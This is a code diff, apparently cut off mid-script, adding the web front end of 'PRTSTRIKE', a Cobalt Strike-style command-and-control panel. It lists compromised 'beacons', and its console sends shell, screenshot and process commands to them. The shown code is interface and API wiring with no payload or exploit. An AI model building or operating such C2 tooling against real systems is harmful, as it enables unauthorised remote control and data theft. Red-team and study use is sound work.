+        .metric-value {
+            font-family: 'Syncopate', sans-serif;
+            font-size: 28px;
+            font-weight: 700;
+            color: #fff;
+        }
+
+        .metric-trend {
+            margin-top: 20px;
+            height: 2px;
+            background: rgba(255,255,255,0.05);
+            position: relative;
+        }
+
+        .trend-fill {
+            height: 100%;
+            background: var(--accent);
+            box-shadow: 0 0 10px var(--accent);
+        }
+
+        .section-header {
+            border-left: 2px solid var(--accent);
+            padding-left: 12px;
+            margin-bottom: 20px;
+            opacity: 0.8;
+        }
+
+        .section-header h3 {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            font-weight: 400;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            color: var(--text-main);
+        }
+
+        .panel-header {
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--border);
+            opacity: 0.8;
+        }
+
+        .panel-header h3 {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            font-weight: 400;
+            letter-spacing: 1.5px;
+            color: var(--accent);
+        }
+
+        .process-table-container {
+            background: rgba(26, 26, 26, 0.4);
+            border: 1px solid var(--border);
+            clip-path: polygon(0 0, 100% 0, 100% 98%, 98% 100%, 0 100%);
+            backdrop-filter: blur(10px) saturate(180%);
+            -webkit-backdrop-filter: blur(10px) saturate(180%);
+        }
+
+        .process-row {
+            display: grid;
+            grid-template-columns: 1fr 150px 100px;
+            padding: 15px 25px;
+            border-bottom: 1px solid rgba(255,255,255,0.03);
+            font-size: 12px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .process-row.header {
+            background: rgba(255, 207, 0, 0.05);
+            color: var(--accent);
+            font-weight: 700;
+            font-size: 9px;
+            text-transform: uppercase;
+        }
+
+        .process-name { color: #fff; }
+        .process-status.active { color: var(--success); }
+        .process-id { color: var(--accent); text-align: right; opacity: 0.6; }
+
+        /* 侧边面板 */
+        .side-panel {
+            background: rgba(8, 8, 8, 0.4);
+            border: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+            clip-path: polygon(0 0, 100% 0, 100% 100%, 10% 100%, 0 90%);
+            backdrop-filter: blur(15px) saturate(180%);
+            -webkit-backdrop-filter: blur(15px) saturate(180%);
+        }
+
+        /* 子页面通用样式 */
+        .content-page {
+            display: none;
+        }
+
+        .content-page.active {
+            display: flex;
+            flex-direction: column;
+            overflow: visible;
+            gap: 25px;
+        }
+
+        /* Welcome Page 增强 */
+        .welcome-screen {
+            padding: 40px;
+            background: rgba(125, 142, 142, 0.05);
+            border: 1px solid rgba(125, 142, 142, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .welcome-screen::before {
+            content: "";
+            position: absolute;
+            top: 0; left: 0; width: 4px; height: 100%;
+            background: var(--accent);
+        }
+
+        /* 列表容器通用 */
+        .list-container {
+            background: rgba(15, 15, 15, 0.6);
+            border: 1px solid var(--border);
+            backdrop-filter: blur(10px);
+        }
+
+        /* 监听器卡片视图 */
+        .listeners-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+        }
+
+        .listener-card {
+            background: rgba(20, 20, 20, 0.8);
+            border: 1px solid var(--border);
+            padding: 20px;
+            position: relative;
+            transition: all 0.3s;
+        }
+
+        .listener-card:hover {
+            border-color: var(--accent);
+            transform: scale(1.02);
+        }
+
+        .listener-card.active {
+            border-left: 4px solid var(--success);
+        }
+
+        /* Payload 构建表单 */
+        .builder-section {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            background: rgba(125, 142, 142, 0.03);
+            padding: 30px;
+            border: 1px solid rgba(125, 142, 142, 0.1);
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-family: 'JetBrains Mono';
+            font-size: 10px;
+            color: var(--accent);
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
+
+        .form-input {
+            width: 100%;
+            background: rgba(0,0,0,0.4);
+            border: 1px solid var(--border);
+            color: #fff;
+            padding: 10px;
+            font-family: 'JetBrains Mono';
+            outline: none;
+        }
+
+        .form-input:focus {
+            border-color: var(--accent);
+        }
+
+        /* 按钮增强 */
+        .btn-primary {
+            background: var(--accent);
+            color: #000;
+            border: none;
+            padding: 12px 25px;
+            font-family: 'JetBrains Mono';
+            font-weight: 700;
+            cursor: pointer;
+            text-transform: uppercase;
+            clip-path: polygon(0 0, 90% 0, 100% 30%, 100% 100%, 10% 100%, 0 70%);
+            transition: all 0.2s;
+        }
+
+        .btn-primary:hover {
+            filter: brightness(1.2);
+            box-shadow: 0 0 20px rgba(125, 142, 142, 0.4);
+        }
+
+        .panel-header {
+            padding: 20px;
+            background: var(--accent);
+            color: #000;
+            font-family: 'Syncopate', sans-serif;
+            font-size: 12px;
+            font-weight: 700;
+            clip-path: polygon(0 0, 100% 0, 100% 80%, 90% 100%, 0 100%);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .panel-header::after {
+            content: "";
+            width: 20px;
+            height: 20px;
+            background: #000;
+            clip-path: polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%);
+        }
+
+        .log-stream {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+            scrollbar-width: none;
+        }
+
+        .log-entry {
+            margin-bottom: 15px;
+            border-left: 1px solid var(--border);
+            padding-left: 12px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            animation: entryIn 0.3s ease-out;
+        }
+
+        @keyframes entryIn {
+            from { opacity: 0; transform: translateX(5px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .log-time { color: var(--accent); margin-right: 10px; }
+        .log-tag { color: var(--text-dim); margin-right: 10px; }
+        .log-msg { color: #888; }
+
+        .beacons-header-bar {
+            display: grid;
+            grid-template-columns: 1fr 150px 1fr 150px 120px 120px 120px;
+            padding: 10px 25px;
+            background: rgba(125, 142, 142, 0.1);
+            border-bottom: 1px solid rgba(125, 142, 142, 0.2);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--accent);
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+
+        .beacons-list {
+            flex: 1;
+            overflow-y: auto;
+        }
+
+        .beacon-row {
+            display: grid;
+            grid-template-columns: 1fr 150px 1fr 150px 120px 120px 120px;
+            padding: 15px 25px;
+            border-bottom: 1px solid rgba(255,255,255,0.03);
+            font-size: 12px;
+            font-family: 'JetBrains Mono', monospace;
+            align-items: center;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .beacon-row:hover {
+            background: rgba(125, 142, 142, 0.05);
+        }
+
+        .beacon-row.selected {
+            background: rgba(125, 142, 142, 0.1);
+            border-left: 4px solid var(--accent);
+        }
+
+        .os-cell { display: flex; align-items: center; gap: 10px; color: #fff; }
+        .ip-cell { color: var(--accent); }
+        .context-cell { color: #888; }
+        .proc-cell { color: #666; }
+        .time-cell { color: #444; }
+        .status-cell { display: flex; align-items: center; gap: 8px; font-size: 10px; }
+        .status-dot.online { background: var(--success); box-shadow: 0 0 10px var(--success); }
+        .status-dot.warning { background: var(--accent-alt); box-shadow: 0 0 10px var(--accent-alt); }
+        .status-dot.offline, .status-dot.dead { background: var(--danger); box-shadow: 0 0 10px var(--danger); }
+        .status-dot.offline + span, .status-dot.dead + span { color: var(--danger); font-weight: bold; }
+        .actions-cell { display: flex; gap: 15px; justify-content: flex-end; }
+        .action-icon { cursor: pointer; opacity: 0.6; transition: opacity 0.2s; }
+        .action-icon:hover { opacity: 1; color: var(--accent); }
+        .action-icon.danger:hover { color: var(--danger); }
+
+
+
+        @keyframes toastIn {
+            from { opacity: 0; transform: translateX(20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        /* Beacon row delete button */
+        .action-icon.danger { color: #888; }
+
+        /* Notification badge on nav items */
+        .nav-badge {
+            position: absolute;
+            top: 8px; right: 8px;
+            width: 6px; height: 6px;
+            border-radius: 50%;
+            background: var(--success);
+            box-shadow: 0 0 6px var(--success);
+        }
+
+        /* ===== Responsive: high zoom / small viewport ===== */
+        @media (max-width: 1400px) {
+            .sidebar { width: 210px; }
+            .nav-item { height: 40px; font-size: 11px; }
+            .nav-item i { font-size: 14px; }
+            header { height: 65px; padding: 0 20px; }
+            .app-wrapper { padding-top: 65px; }
+            .logo-text { font-size: 20px; letter-spacing: 5px; }
+            .logo-text::after { font-size: 7px; bottom: -10px; }
+            .rhine-data-stream { font-size: 9px; padding: 5px 10px; }
+            .builder-section { grid-template-columns: 1fr; gap: 15px; padding: 20px; }
+            .header-right { gap: 15px; }
+            .operator-info { font-size: 10px; }
+        }
+
+        @media (max-width: 1100px) {
+            .sidebar { width: 180px; }
+            .nav-item { height: 38px; font-size: 10px; clip-path: none; }
+            .nav-item i { font-size: 13px; }
+            .nav-item { grid-template-columns: 30px 1fr; }
+            header { height: 55px; padding: 0 15px; }
+            .app-wrapper { padding-top: 55px; }
+            .logo-text { font-size: 16px; letter-spacing: 3px; }
+            .logo-text::after { display: none; }
+            .rhine-tag { font-size: 8px; letter-spacing: 2px; }
+            .rhine-data-stream { display: none; }
+            .btn-primary { padding: 8px 16px; font-size: 10px; clip-path: none; }
+            .logout-link { font-size: 9px; padding: 4px 10px; clip-path: none; }
+            .logout-link::before { display: none; }
+            main { padding: 12px; }
+        }
+
+        @media (max-width: 850px) {
+            .sidebar { width: 55px; }
+            .nav-label { display: none; }
+            .nav-item { grid-template-columns: 1fr; justify-items: center; height: 38px; padding: 0; clip-path: none; }
+            .sidebar-header span { font-size: 0; }
+            .sidebar-header { height: 30px !important; padding: 5px !important; }
+            header { height: 48px; padding: 0 10px; }
+            .app-wrapper { padding-top: 48px; }
+            .brand-logo { margin-right: 10px !important; }
+            .logo-text { font-size: 14px; letter-spacing: 2px; }
+            .rhine-tag { display: none; }
+            .operator-info { font-size: 9px; gap: 5px; }
+            .operator-info i { display: none; }
+            .header-right { gap: 10px; }
+            main { padding: 8px; }
+            .modal-content { width: 95vw; height: 80vh; }
+            .bottom-console { height: 150px; }
+            .console-input-area { height: 30px; }
+            .console-input { font-size: 11px; }
+            .console-prompt { font-size: 10px; margin-right: 5px; }
+        }
+
+    </style>
+    <style>
+        .glitch-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+            width: 100%;
+        }
+        
+        .glitch-text {
+            font-family: 'Syncopate', sans-serif;
+            font-size: 48px;
+            font-weight: 900;
+            color: var(--accent);
+            letter-spacing: 10px;
+            position: relative;
+            animation: glitch-anim 0.3s infinite;
+        }
+
+        .glitch-text::before,
+        .glitch-text::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+        }
+
+        .glitch-text::before {
+            left: 2px;
+            text-shadow: -1px 0 var(--glitch-red);
+            clip: rect(24px, 550px, 90px, 0);
+            animation: glitch-anim-2 2s infinite linear alternate-reverse;
+        }
+
+        .glitch-text::after {
+            left: -2px;
+            text-shadow: -1px 0 var(--glitch-cyan);
+            clip: rect(85px, 550px, 140px, 0);
+            animation: glitch-anim-2 2s infinite linear alternate-reverse;
+        }
+
+        @keyframes glitch-anim {
+            0% { text-shadow: -2px 3px 0 var(--glitch-red), 2px -3px 0 var(--glitch-cyan); transform: translate(var(--glitch-translate)); }
+            20% { text-shadow: 2px -3px 0 var(--glitch-red), -2px 3px 0 var(--glitch-cyan); }
+            40%, 100% {  text-shadow: none; transform: none; }
+        }
+
+        @keyframes glitch-anim-2 {
+            0% { clip: rect(10px, 9999px, 30px, 0); }
+            20% { clip: rect(80px, 9999px, 100px, 0); }
+            40% { clip: rect(40px, 9999px, 60px, 0); }
+            60% { clip: rect(20px, 9999px, 10px, 0); }
+            80% { clip: rect(60px, 9999px, 50px, 0); }
+            100% { clip: rect(90px, 9999px, 100px, 0); }
+        }
+
+        html, body { 
+            background: #000 !important; 
+            scrollbar-width: none; /* Firefox */
+            -ms-overflow-style: none; /* IE/Edge */
+        }
+        
+        ::-webkit-scrollbar {
+            display: none;
+        }
+
+        #entrance-overlay { opacity: 1 !important; visibility: visible !important; }
+    </style>
+</head>
+<body>
+    <div class="scan-line-overlay"></div>
+
+    <div class="entrance-overlay" id="entrance-overlay">
+        <div class="glitch-wrapper">
+            <div class="glitch-text" data-text="ACCESS_GRANTED">ACCESS_GRANTED</div>
+        </div>
+    </div>
+    <div class="noise-overlay"></div>
+    <div class="bg-deco"></div>
+
+
+
+    <div class="terra-deco terra-vertical" style="top: 150px; left: 20px;">
+        ΠΝΕΥΜΑ // ΕΠΙΣΤΗΜΗ // ΤΕΧΝΟΛΟΓΙΑ // 0xFF42
+    </div>
+    <div class="terra-deco" style="bottom: 20px; left: 40px;">
+        PRTSTRIKE_SYSTEM_OVERRIDE // [STATUS: ENCRYPTED]
+    </div>
+
+    <div class="side-numbers">
+        <div>0XFF42</div><div>0X8811</div><div>0X011C</div><div>0X04A2</div>
+        <div>0XFF42</div><div>0X8811</div><div>0X011C</div><div>0X04A2</div>
+        <div>0XFF42</div><div>0X8811</div><div>0X011C</div><div>0X04A2</div>
+    </div>
+    <div class="app-wrapper">
+        <header class="header">
+            <div class="header-left">
+                <div class="brand-logo" style="margin-right: 40px;">
+                    <span class="rhine-tag">com.prts.strike</span>
+                    <span class="logo-text">PRTSTRIKE</span>
+                </div>
+                <div class="rhine-data-stream">
+                    <span class="pulse"></span> [DATA_STREAM: 0.124ms] // [LINK: ESTABLISHED]
+                </div>
+            </div>
+            <div class="header-right">
+                <div class="operator-info">
+                    <i class="fas fa-user-secret"></i> OPERATOR: <span id="operator-name">Operator</span>
+                </div>
+                <a href="/api/logout" class="logout-link">Terminate Session</a>
+            </div>
+        </header>
+
+        <div class="app-body">
+            <aside class="sidebar">
+                <div class="sidebar-header" style="height: 50px; justify-content: flex-start; padding: 15px 20px;">
+                    <span style="font-size: 10px; color: var(--accent); letter-spacing: 2px; font-family: 'JetBrains Mono'; opacity: 0.6;">NAVIGATION_SYSTEM</span>
+                </div>
+
+                <nav class="sidebar-nav">
+                    <a href="#" class="nav-item active" data-page="welcome">
+                        <i class="fas fa-home"></i>
+                        <span class="nav-label">WELCOME</span>
+                    </a>
+                    <a href="#" class="nav-item" data-page="beacons">
+                        <i class="fas fa-satellite-dish"></i>
+                        <span class="nav-label">BEACONS</span>
+                    </a>
+                    <a href="#" class="nav-item" data-page="listeners">
+                        <i class="fas fa-broadcast-tower"></i>
+                        <span class="nav-label">LISTENERS</span>
+                    </a>
+                    <a href="#" class="nav-item" data-page="payloads">
+                        <i class="fas fa-box-open"></i>
+                        <span class="nav-label">PAYLOADS</span>
+                    </a>
+                    <a href="#" class="nav-item" data-page="files">
+                        <i class="fas fa-folder-open"></i>
+                        <span class="nav-label">FILES</span>
+                    </a>
+                    <a href="#" class="nav-item" data-page="tasks">
+                        <i class="fas fa-tasks"></i>
+                        <span class="nav-label">TASKS</span>
+                    </a>
+                    <a href="#" class="nav-item" data-page="proxies">
+                        <i class="fas fa-random"></i>
+                        <span class="nav-label">PROXIES</span>
+                    </a>
+                    <a href="#" class="nav-item" data-page="settings">
+                        <i class="fas fa-cog"></i>
+                        <span class="nav-label">SETTINGS</span>
+                    </a>
+                    <a href="#" class="nav-item" data-page="logs">
+                        <i class="fas fa-file-medical-alt"></i>
+                        <span class="nav-label">LOGS</span>
+                    </a>
+                </nav>
+            </aside>
+
+            <div class="main-container">
+                <main class="main-content" id="module-container">
+                    <!-- Dynamic modules will be loaded here -->
+                    <div class="content-page active" id="page-loader">
+                        <div style="display: flex; justify-content: center; align-items: center; height: 100%; opacity: 0.3; font-family: 'JetBrains Mono'; letter-spacing: 5px;">
+                            LOADING_PRT_MODULE...
+                        </div>
+                    </div>
+                </main>
+
+                <!-- 底部战术控制台 (CobaltStrike style - inside flex layout) -->
+                <div class="bottom-console" id="bottom-console">
+                    <div class="console-header">
+                        <div class="console-tabs">
+                            <div class="console-tab active" data-tab="log">Event Log</div>
+                        </div>
+                        <div style="display:flex; align-items:center; gap:10px;">
+                            <span id="console-beacon-tag" style="font-family:'JetBrains Mono';font-size:10px;color:var(--success);display:none;"></span>
+                            <span class="console-meta" style="font-size: 8px; color: var(--text-dim);">V1.0.0_STABLE</span>
+                            <button class="console-toggle" onclick="toggleConsole()" title="Toggle console">▼</button>
+                        </div>
+                    </div>
+                    <div class="console-body" id="console-output"></div>
+                    <div class="console-input-area">
+                        <span class="console-prompt" id="console-prompt">prtstrike ></span>
+                        <input type="text" class="console-input" placeholder="help | shell [cmd] | sleep [s] [j] | sysinfo | ps ..." id="console-cmd" autocomplete="off" spellcheck="false">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+
+    <!-- Interaction Modal -->
+    <div class="modal-overlay" id="interact-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">INTERACT: <span id="target-id">192.168.1.105</span></div>
+                <div class="modal-close" id="close-modal">&times;</div>
+            </div>
+            <div class="interact-terminal" id="interact-output"></div>
+            <div class="interact-input-area">
+                <span class="interact-prompt">prtshell ></span>
+                <input type="text" class="interact-input" id="interact-cmd" autofocus>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // --- 全局状态管理 ---
+        const state = {
+            clients: [],
+            ws: null,
+            maxLogs: 100,
+            username: 'Operator'
+        };
+
+        // --- WebSocket 连接 ---
+        function initWebSocket() {
+            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsUrl = `${protocol}//${window.location.host}/ws`;
+            
+            state.ws = new WebSocket(wsUrl);
+
+            state.ws.onopen = () => {
+                appendLog('SYSTEM', 'WS_LINK: ESTABLISHED', 'success');
+                const streamEl = document.querySelector('.rhine-data-stream');
+                if (streamEl) {
+                    streamEl.innerHTML = '<span class="pulse"></span> [DATA_STREAM: ACTIVE] // [LINK: ESTABLISHED]';
+                }
+            };
+
+            state.ws.onmessage = (event) => {
+                try {
+                    const data = JSON.parse(event.data);
+                    // Handle special events
+                    if (data.type === 'new_beacon') {
+                        handleNewBeaconEvent(data);
+                        return;
+                    }
+                    if (data.type === 'beacon_offline') {
+                        appendLog('C2', `BEACON_OFFLINE: ${data.hostname || data.beacon_id} (${data.ip})`, 'warning');
+                        fetchClients();
+                        return;
+                    }
+                    // Regular log message
+                    if (data.level) {
+                        appendLog(data.level, data.message, data.level.toLowerCase());
+                    }
+                } catch (e) {
+                    appendLog('INFO', event.data);
+                }
+            };
+
+            state.ws.onclose = () => {
+                appendLog('SYSTEM', 'WS_LINK: TERMINATED. RETRYING...', 'warning');
+                const streamEl = document.querySelector('.rhine-data-stream');
+                if (streamEl) {
+                    streamEl.innerHTML = '<span class="pulse" style="background: var(--danger); box-shadow: 0 0 8px var(--danger);"></span> [DATA_STREAM: OFFLINE] // [LINK: LOST]';
+                }
+                setTimeout(initWebSocket, 3000);
+            };
+
+            state.ws.onerror = (error) => {
+                appendLog('ERROR', 'WS_ERROR: CONNECTION FAILED', 'error');
+            };
+        }
+
+        // --- API 调用 ---
+        async function fetchUserInfo() {
+            try {
+                const response = await fetch('/api/userinfo', {
+                    headers: { 'X-Requested-With': 'XMLHttpRequest' }
+                });
+                if (response.status === 401) return;
+                const result = await response.json();
+                if (result.status === 'success') {
+                    const opName = result.data.username || 'Operator';
+                    state.username = opName;
+                    const opNameEls = document.querySelectorAll('#operator-name, #welcome-op');
+                    opNameEls.forEach(el => el.innerText = opName);
+                }
+            } catch (error) {
+                console.error('Fetch User Info Error:', error);
+            }
+        }
+
+        async function fetchClients() {
+            try {
+                const response = await fetch('/api/clients', {
+                    headers: { 'X-Requested-With': 'XMLHttpRequest' }
+                });
+                
+                if (response.status === 401) {
+                    console.warn('Unauthorized access, redirecting to login...');
+                    window.location.href = '/';
+                    return;
+                }
+
+                const result = await response.json();
+                if (result.status === 'success') {
+                    state.clients = result.data;
+                    renderClients();
+                }
+            } catch (error) {
+                appendLog('ERROR', 'FAILED TO FETCH CLIENTS: ' + error.message, 'error');
+            }
+        }
+
+        // --- UI 渲染逻辑 ---
+        function updateMetrics() {
+            const countEl = document.getElementById('count-beacons');
+            if (countEl) {
+                const onlineCount = state.clients.filter(c => c.status === 'online').length;
+                countEl.innerText = onlineCount.toString().padStart(2, '0');
+            }
+        }
+
+        function updateClock() {
+            const clockEl = document.getElementById('sys-time');
+            if (clockEl) {
+                const now = new Date();
+                clockEl.innerText = now.toLocaleTimeString('en-GB', { hour12: false });
+            }
+        }
+
+        function formatLastSeen(isoStr) {
+            if (!isoStr || isoStr === '0001-01-01T00:00:00Z') return '--:--:--';
+            const diff = Math.floor((Date.now() - new Date(isoStr).getTime()) / 1000);
+            if (diff < 0) return 'just now';
+            if (diff < 60) return diff + 's ago';
+            if (diff < 3600) return Math.floor(diff / 60) + 'm ago';
+            if (diff < 86400) return Math.floor(diff / 3600) + 'h ago';
+            return Math.floor(diff / 86400) + 'd ago';
+        }
+
+        function renderClients() {
+            const container = document.getElementById('beacons-list-body');
+            if (!container) return;
+
+            container.innerHTML = '';
+            if (state.clients.length === 0) {
+                container.innerHTML = `
+                    <div style="padding: 40px; text-align: center; opacity: 0.3; font-family: 'JetBrains Mono';">
+                        NO_ACTIVE_BEACONS_DETECTED
+                    </div>
+                `;
+                return;
+            }
+
+            state.clients.forEach(client => {
+                const row = document.createElement('div');
+                row.className = `beacon-row ${client.status === 'online' ? '' : 'offline'}`;
+                row.dataset.id = client.id;
+                row.style.gridTemplateColumns = '40px 1fr 140px 140px 1fr 100px 100px 120px 100px';
+                row.style.minWidth = '880px';
+                const osIcon = client.os.toLowerCase().includes('win') ? 'windows' : 'linux';
+                const osColor = client.os.toLowerCase().includes('win') ? '#00a4ef' : '#f0ad4e';
+                const adminBadge = client.is_admin ? '<span style="color:#ff9800;font-size:9px;margin-left:4px;" title="Admin">&#9733;</span>' : '';
+                const userDisplay = (client.username || '-') + adminBadge;
+                const hostDisplay = client.hostname || client.name || '-';
+                const ipDisplay = client.internal_ip || client.ip || '-';
+                row.innerHTML = `
+                    <div style="display:flex;align-items:center;justify-content:center;">
+                        <i class="fab fa-${osIcon}" style="color:${osColor}; font-size:16px;"></i>
+                    </div>
+                    <div style="display:flex;flex-direction:column;gap:2px;">
+                        <span style="font-weight:bold;color:#fff;">${hostDisplay}</span>
+                        <span style="font-size:9px;color:#666;">${client.id.substring(0,16)}</span>
+                    </div>
+                    <div class="ip-cell" style="display:flex;flex-direction:column;gap:2px;">
+                        <span>${client.ip}</span>
+                        <span style="font-size:9px;color:#555;">${ipDisplay !== client.ip ? ipDisplay : ''}</span>
+                    </div>
+                    <div style="font-family:'JetBrains Mono';">${userDisplay}</div>
+                    <div style="font-size:10px;color:#888;">${client.process_name || '-'} (${client.pid || '-'})</div>
+                    <div class="time-cell">${formatLastSeen(client.last_check)}</div>
+                    <div style="font-size:10px;color:#666;">${client.sleep || '-'}s / ${client.jitter || '-'}%</div>
+                    <div class="status-cell">
+                        <div class="status-dot ${client.status}"></div>
+                        <span>${client.status.toUpperCase()}</span>
+                    </div>
+                    <div class="actions-cell">
+                        <i class="fas fa-terminal action-icon" onclick="event.stopPropagation(); selectBeacon('${client.id}', '${client.ip}')" title="Interact"></i>
+                        <i class="fas fa-camera action-icon" onclick="event.stopPropagation(); takeScreenshot('${client.id}')" title="Screenshot"></i>
+                        <i class="fas fa-info-circle action-icon" onclick="event.stopPropagation(); showBeaconDetail('${client.id}')" title="Detail"></i>
+                        <i class="fas fa-times action-icon danger" onclick="event.stopPropagation(); deleteBeacon('${client.id}')" title="Remove"></i>
+                    </div>
+                `;
+                
+                // Left click to select
+                row.addEventListener('click', (e) => {
+                     // Don't trigger if clicking actions
+                    if (e.target.closest('.actions-cell')) return;
+                    selectBeacon(client.id, client.ip);
+                });
+
+
+
+                container.appendChild(row);
+            });
+            
+            // Re-apply selection visual if needed
+            if (currentBeaconId) {
+                const selectedRow = container.querySelector(`.beacon-row[data-id="${currentBeaconId}"]`);
+                if (selectedRow) selectedRow.classList.add('selected');
+            }
+            
+            updateMetrics();
+        }
+
+        function selectBeacon(id, ip) {
+            const wasNew = currentBeaconId !== id;
+            currentBeaconId = id;
+            currentBeaconIp = ip;
+
+            // Update UI
+            document.querySelectorAll('.beacon-row').forEach(r => r.classList.remove('selected'));
+            const row = document.querySelector(`.beacon-row[data-id="${id}"]`);
+            if (row) row.classList.add('selected');
+
+            // Update Terminal Prompt (CobaltStrike style)
+            const prompt = document.getElementById('console-prompt');
+            if (prompt) {
+                const client = (state.clients || []).find(c => c.id === id);
+                const hostLabel = client ? (client.hostname || ip) : ip;
+                prompt.innerText = `beacon (${hostLabel}) >`;
+                prompt.style.color = 'var(--success)';
+            }
+
+            // Update beacon tag in console header
+            const tag = document.getElementById('console-beacon-tag');
+            if (tag) {
+                const client = (state.clients || []).find(c => c.id === id);
+                tag.style.display = 'inline';
+                tag.innerText = `[${client ? (client.username||'')+'@'+(client.hostname||ip) : ip}]`;
+            }
+
+            // Update Interact Modal Title
+            const modalTitle = document.getElementById('target-id');
+            if (modalTitle) modalTitle.innerText = ip;
+
+            // Expand console if collapsed
+            const bc = document.getElementById('bottom-console');
+            if (bc && bc.classList.contains('collapsed')) {
+                bc.classList.remove('collapsed');
+            }
+
+            // Focus console input
+            if (wasNew) {
+                const ci = document.getElementById('console-cmd');
+                if (ci) ci.focus();
+            }
+        }
+
+        async function deleteBeacon(id) {
+            if (!confirm('Remove beacon ' + id + ' from inventory?')) return;
+            try {
+                const resp = await fetch('/api/clients/' + id, {
+                    method: 'DELETE',
+                    headers: { 'X-Requested-With': 'XMLHttpRequest' }
+                });
+                const result = await resp.json();
+                showNotification(result.message);
+                if (currentBeaconId === id) {
+                    currentBeaconId = '';
+                    currentBeaconIp = '';
+                    const prompt = document.getElementById('console-prompt');
+                    if (prompt) { prompt.innerText = 'prtstrike >'; prompt.style.color = 'var(--accent)'; }
+                    const tag = document.getElementById('console-beacon-tag');
+                    if (tag) tag.style.display = 'none';
+                }
+                fetchClients();
+            } catch(e) { showNotification('ERROR: ' + e.message); }
+        }
+
+        function appendLog(level, msg, type = 'info') {
+            const container = document.getElementById('console-output');
+            if (!container) return;
+
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            const time = new Date().toLocaleTimeString('en-GB', { hour12: false });
+
+            entry.innerHTML = `
+                <span class="log-time">[${time}]</span>
+                <span class="log-tag">[${level}]</span>
+                <span class="log-msg">${msg}</span>
+            `;
+
+            container.appendChild(entry);
+
+            // 限制日志条数
+            while (container.children.length > state.maxLogs) {
+                container.firstChild.remove();
+            }
+
+            // 自动滚动到底部
+            container.scrollTop = container.scrollHeight;
+        }
+
+        // 生成转场日志 (与 index.php 对齐)
+        function createTransitionLogs() {
+            const container = document.getElementById('curtainLogs');
+            if (!container) return;
+            const logTypes = ['[INFO]', '[SYSTEM]', '[AUTH]', '[SEC]', '[DEBUG]'];
+            const logActions = [
+                'CONNECTING_TO_PRTS_SERVER...',
+                'VALIDATING_CLEARANCE_LEVEL_05',
+                'INITIALIZING_NEURAL_INTERFACE',
+                'DECRYPTING_TACTICAL_DATA_STREAM',
+                'BYPASSING_EXTERNAL_FIREWALL',
+                'LOADING_OPERATOR_DATABASE',
+                'SYNCING_REAL_TIME_METRICS',
+                'ESTABLISHING_SECURE_TUNNEL',
+                'ALLOCATING_VIRTUAL_MEMORY',
+                'BOOTING_PRTS_SUBSYSTEM'
+            ];
+
+            for(let i=0; i<120; i++) { // 对齐 index.php 的 120 条
+                const line = document.createElement('div');
+                line.className = 'log-line';
+                const timestamp = new Date().getTime().toString(16).toUpperCase();
+                const type = logTypes[Math.floor(Math.random() * logTypes.length)];
+                const action = logActions[Math.floor(Math.random() * logActions.length)];
+                line.innerText = `${timestamp} ${type} ${action}`;
+                container.appendChild(line);
+            }
+        }
+
+        // 衔接动画控制
+        function revealPage() {
+            const overlay = document.getElementById('entrance-overlay');
+            if (overlay) {
+                overlay.classList.add('hidden');
+                // 彻底移除背景强制色由 body.revealed 的 CSS transition 处理
+            }
+            document.body.classList.add('revealed');
+        }
+
+        // --- 模块加载逻辑 ---
+        async function loadModule(moduleName) {
+            const container = document.getElementById('module-container');
+
+            try {
+                const response = await fetch(`static/modules/${moduleName}.html?t=${Date.now()}`);
+                if (!response.ok) throw new Error(`Module ${moduleName} not found`);
+
+                const html = await response.text();
+
+                // 清空容器
+                container.innerHTML = `<div class="content-page active" id="page-${moduleName}"></div>`;
+                const pageEl = document.getElementById('page-' + moduleName);
+
+                // 分离 HTML 和 Script，手动执行 script 标签
+                const tempDiv = document.createElement('div');
+                tempDiv.innerHTML = html;
+
+                // 先插入非 script 内容
+                const scripts = [];
+                tempDiv.querySelectorAll('script').forEach(s => {
+                    scripts.push(s.textContent);
+                    s.remove();
+                });
+                pageEl.innerHTML = tempDiv.innerHTML;
+
+                // 再执行 script
+                scripts.forEach(code => {
+                    try { new Function(code)(); } catch(e) { console.error('Module script error:', e); }
+                });
+
+                // 模块加载后的初始化逻辑
+                if (moduleName === 'beacons') {
+                    renderClients();
+                    updateMetrics();
+                } else if (moduleName === 'welcome') {
+                    fetchUserInfo();
+                    updateMetrics();
+                }
+            } catch (error) {
+                console.error('Module Load Error:', error);
+                container.innerHTML = `
+                    <div class="content-page active">
+                        <div style="padding: 40px; color: var(--danger); font-family: 'JetBrains Mono';">
+                            [!] FAILED_TO_LOAD_MODULE: ${moduleName.toUpperCase()}<br>
+                            [?] ERROR: ${error.message}
+                        </div>
+                    </div>
+                `;
+            }
+        }
+
+        // 初始化
+        window.addEventListener('load', () => {
+            createTransitionLogs();
+            updateClock();
+            setInterval(updateClock, 1000);
+            
+            const justLoggedIn = sessionStorage.getItem('justLoggedIn');
